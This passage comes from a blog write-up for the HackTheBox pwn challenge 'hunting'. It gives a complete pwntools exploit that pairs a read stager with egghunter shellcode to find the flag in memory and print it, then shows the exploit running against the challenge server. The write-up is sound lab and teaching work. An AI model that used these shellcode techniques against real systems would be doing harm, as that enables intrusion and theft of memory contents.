+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7ffc000</span> <span class="mi">0xf7ffd000</span> <span class="mi">0x0002a000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">i386-linux-gnu</span><span class="err">/</span><span class="no">ld-2.31.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7ffd000</span> <span class="mi">0xf7ffe000</span> <span class="mi">0x0002b000</span> <span class="no">rwx</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">i386-linux-gnu</span><span class="err">/</span><span class="no">ld-2.31.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xfffdd000</span> <span class="mi">0xffffe000</span> <span class="mi">0x00000000</span> <span class="no">rwx</span> <span class="p">[</span><span class="no">stack</span><span class="p">]</span>
+</span></span></code></pre></div><p>Paying close attention to these, flag resides in  <code>0x74b90000  - 0x74b90024  →   &quot;HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}&quot;</code> which when we see in <code>vmmap</code> which shows the numbers of the memory pages used by the executable turns out to be from the <code>ummap</code>&rsquo;d region.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x74b90000</span> <span class="mi">0x74b91000</span> <span class="mi">0x00000000</span> <span class="no">rwx</span> <span class="err">/</span><span class="no">dev</span><span class="err">/</span><span class="no">zero</span> <span class="p">(</span><span class="no">deleted</span><span class="p">)</span>
+</span></span></code></pre></div><p>So, therefore, what we see here is the flag belongs to a 0 initialized memory region, what can we do now?</p>
+<p>There&rsquo;s a shellcode technique called <code>egghunting</code> which is used to search for <code>EGG</code> which could be string/address/byte/DWORD or anything which resides in memory which we want to search for, since the memory region where the flag resides still belongs to the binary process image, we can use <code>egghunting</code> technique shellcode and once we get the memory pointed to the <code>HTB{</code> we can print it by just calling write.</p>
+<h1 id="exploit-development-and-debugging" class="relative group">Exploit Development and Debugging <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploit-development-and-debugging" aria-label="Anchor">#</a></span></h1><p>So, without further ado, let&rsquo;s start, what we can do here is now:-</p>
+<ul>
+<li>Call egghunting shellcode and search for string <code>HTB{</code> in the process image.</li>
+<li>Once found, print it with the <code>write</code></li>
+</ul>
+<p>Let&rsquo;s start by first finding the <code>HTB</code> string:-</p>
+<p>With the help of the <code>shellcraft.egghunter(string, starting_address)</code> of pwntools, we can give the string we want to find and the starting address to let it prepare the shellcode for us.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./hunting&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">egghunter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;HTB{&#34;</span><span class="p">,</span> <span class="mh">0x50000000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><blockquote>
+<p>NOTE: Since PIE is enabled, the base address for the binary would start from here, more or less, <code>0x50000000</code> marking it as starting address saved seconds(I am picky).</p>
+</blockquote>
+<p>Running the exploit and attaching it to the <code>gdb</code>:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0xfffffffe</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x69df0000</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">HTB</span><span class="err">{</span><span class="no">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="err">}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$ecx</span>   <span class="p">:</span> <span class="mi">0x0</span>       
+</span></span><span class="line"><span class="cl"><span class="no">$edx</span>   <span class="p">:</span> <span class="mi">0x400</span>     
+</span></span><span class="line"><span class="cl"><span class="no">$esp</span>   <span class="p">:</span> <span class="mi">0xfff30008</span>  <span class="err">→</span>  <span class="mi">0x7b425448</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">HTB</span><span class="err">{&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$ebp</span>   <span class="p">:</span> <span class="mi">0xfff30028</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$esi</span>   <span class="p">:</span> <span class="mi">0xfff3000c</span>  <span class="err">→</span>  <span class="mi">0x5655b44f</span>  <span class="err">→</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$edi</span>   <span class="p">:</span> <span class="mi">0x69df0004</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="err">}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$eip</span>   <span class="p">:</span> <span class="mi">0x579fe1d9</span>  <span class="err">→</span>  <span class="mi">0x29000000</span>
+</span></span></code></pre></div><p>Nice, we have the flag in <code>ebx</code> register, so, we can now just do</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="no">$ebx</span><span class="p">,</span> <span class="mi">0x100</span><span class="p">)</span>
+</span></span></code></pre></div><p>where <code>ebx</code> is a memory pointer to the flag.</p>
+<hr>
+<h3 id="the-length-issue" class="relative group">The Length Issue <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-length-issue" aria-label="Anchor">#</a></span></h3><p>Okay, so at this time I did</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./hunting&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">egghunter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;HTB{&#34;</span><span class="p">,</span> <span class="mh">0x50000000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;ebx&#34;</span><span class="p">,</span> <span class="mi">36</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>But I forgot that the length allowed was only <code>0x30</code> which was pretty much taken by the egghunter shellcode, so we need something to act as a stager shellcode. So, to do work through this, what we can do is call <code>read</code> to make the binary read large amount of input.</p>
+<p>The shellcode would be as follows:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">0xff</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">int</span> <span class="mi">0x80</span>
+</span></span></code></pre></div><p>To understand the shellcode, we <code>xor</code>&rsquo;d the <code>eax</code> to make it <code>0</code> then we move <code>3</code> to the lower 16 bit of the register <code>eax</code> pointed by <code>al</code>, then we <code>xor</code>&rsquo;d <code>ebx</code> register which will make it <code>0</code> as well, after that we move <code>0xff</code> to the lower 16 bits of the <code>edx</code> pointed by <code>dl</code>, then we do <code>int 0x80</code> to do a syscall.</p>
+<p>So, here:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="no">ebx</span><span class="p">,</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">edx</span><span class="p">)</span>
+</span></span></code></pre></div><p>Where <code>ebx</code> points to the <code>fd</code>, as it has been XOR&rsquo;d it contains <code>0</code> which the <code>fd</code> of the <code>stdin</code> then <code>ecx</code> when the time of the execution of the shellcode pointes to the buffer itself, so we don&rsquo;t manipulate it&rsquo;s value, next, <code>edx</code> contains the size which is <code>0xff</code>, more than enough for us.</p>
+<blockquote>
+<p><code>eax</code> points to the syscall number, read syscall number is 3 and the <code>int 0x80</code> is used to tell the program we are making syscall, since <code>eax</code> is <code>3</code> the <code>read</code> will be made.</p>
+</blockquote>
+<p>Now, let&rsquo;s check if it works:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./hunting&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">	xor eax, eax
+</span></span></span><span class="line"><span class="cl"><span class="s2">	mov al, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">	xor ebx, ebx
+</span></span></span><span class="line"><span class="cl"><span class="s2">	mov dl, 0xff
+</span></span></span><span class="line"><span class="cl"><span class="s2">	int 0x80&#34;&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;SHELLCODE LENGTH:  </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running it and attaching <code>gdb</code> to one side:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">Pwning</span><span class="err">/</span><span class="no">HackTheBox$</span> <span class="no">python3</span> <span class="no">hunting.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">hunting</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">23502</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">SHELLCODE</span> <span class="no">LENGTH</span><span class="p">:</span>  <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">(</span><span class="no">press</span> <span class="no">any</span> <span class="no">to</span> <span class="no">continue</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span>  
+</span></span></code></pre></div><p>In <code>gdb</code> window:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0xffe9941b</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">i686</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x1f</span>      
+</span></span><span class="line"><span class="cl"><span class="no">$ecx</span>   <span class="p">:</span> <span class="mi">0xf</span>       
+</span></span><span class="line"><span class="cl"><span class="no">$edx</span>   <span class="p">:</span> <span class="mi">0xffe9bfee</span>  <span class="err">→</span>  <span class="mi">0x75682f2e</span> <span class="p">(</span><span class="err">&#34;</span><span class="p">.</span><span class="err">/</span><span class="no">hu</span><span class="err">&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$esp</span>   <span class="p">:</span> <span class="mi">0xffe993f4</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$ebp</span>   <span class="p">:</span> <span class="mi">0x1a</span>      
+</span></span><span class="line"><span class="cl"><span class="no">$esi</span>   <span class="p">:</span> <span class="mi">0xffe9940b</span>  <span class="err">→</span>  <span class="mi">0x0d4809be</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$edi</span>   <span class="p">:</span> <span class="mi">0x19</span>      
+</span></span><span class="line"><span class="cl"><span class="no">$eip</span>   <span class="p">:</span> <span class="mi">0x5754f1c8</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span></code></pre></div><p>The <code>eip</code> points to the input we gave but certainly not from the start, let&rsquo;s check the offset:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="no">kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">40</span> <span class="p">(</span><span class="no">big-endian</span> <span class="no">search</span><span class="p">)</span> 
+</span></span></code></pre></div><p>This done, we will just know that:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</span></span></code></pre></div><p>We are almost done.</p>
+<hr>
+<p>Now, we will just add <code>shellcraft.write(1, 'ebx', 36)</code> with our previous work and we are done :)</p>
+<p>The final exploit looks like:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./hunting&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send the stager shellcode to read the bigger shellcode later</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">	xor eax, eax
+</span></span></span><span class="line"><span class="cl"><span class="s2">	mov al, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">	xor ebx, ebx
+</span></span></span><span class="line"><span class="cl"><span class="s2">	mov dl, 0xff
+</span></span></span><span class="line"><span class="cl"><span class="s2">	int 0x80&#34;&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;SHELLCODE LENGTH:  </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="c1"># Offset to the EIP</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The Egghunter shellcode to search for the memory having `HTB{` strting</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">egghunter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;HTB{&#34;</span><span class="p">,</span> <span class="mh">0x50000000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Once found, the `ebx` points to the flag, so we just print it</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;ebx&#34;</span><span class="p">,</span> <span class="mi">36</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Recieve the flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;FLAG:   </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>That aside, let&rsquo;s run it and this time without <code>gdb</code>:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">Pwning</span><span class="err">/</span><span class="no">HackTheBox$</span> <span class="no">python3</span> <span class="no">hunting.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">hunting</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">23649</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">SHELLCODE</span> <span class="no">LENGTH</span><span class="p">:</span>  <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nl">FLAG:</span>   <span class="nf">b</span><span class="err">&#39;</span><span class="no">HTB</span><span class="err">{</span><span class="no">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="err">}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">hunting</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">23649</span><span class="p">)</span>
+</span></span></code></pre></div><p>Voila, we get the flag, let&rsquo;s run the exploit for the remote server:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">Pwning</span><span class="err">/</span><span class="no">HackTheBox$</span> <span class="no">python3</span> <span class="no">hunting.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="mi">165</span><span class="no">.232.101.10</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">31335</span><span class="p">:</span> <span class="no">Done</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">SHELLCODE</span> <span class="no">LENGTH</span><span class="p">:</span>  <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nl">FLAG:</span>   <span class="nf">b</span><span class="err">&#39;</span><span class="no">HTB</span><span class="err">{</span><span class="no">H0w_0n_34rth_d1d_y0u_f1nd_m3</span><span class="err">?</span><span class="p">!</span><span class="err">?}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Closed</span> <span class="no">connection</span> <span class="no">to</span> <span class="mi">165</span><span class="no">.232.101.10</span> <span class="no">port</span> <span class="mi">31335</span>
+</span></span></code></pre></div><p>And done!</p>
+<p>That was quite a nice ride, hope you learned something :)</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/toxin/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox Pwn: Toxin</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-02-13 00:00:00 &#43;0000 UTC">13 February 2021</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/ductf/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >DCTF - 2021</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-05-07 00:00:00 &#43;0000 UTC">7 May 2021</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
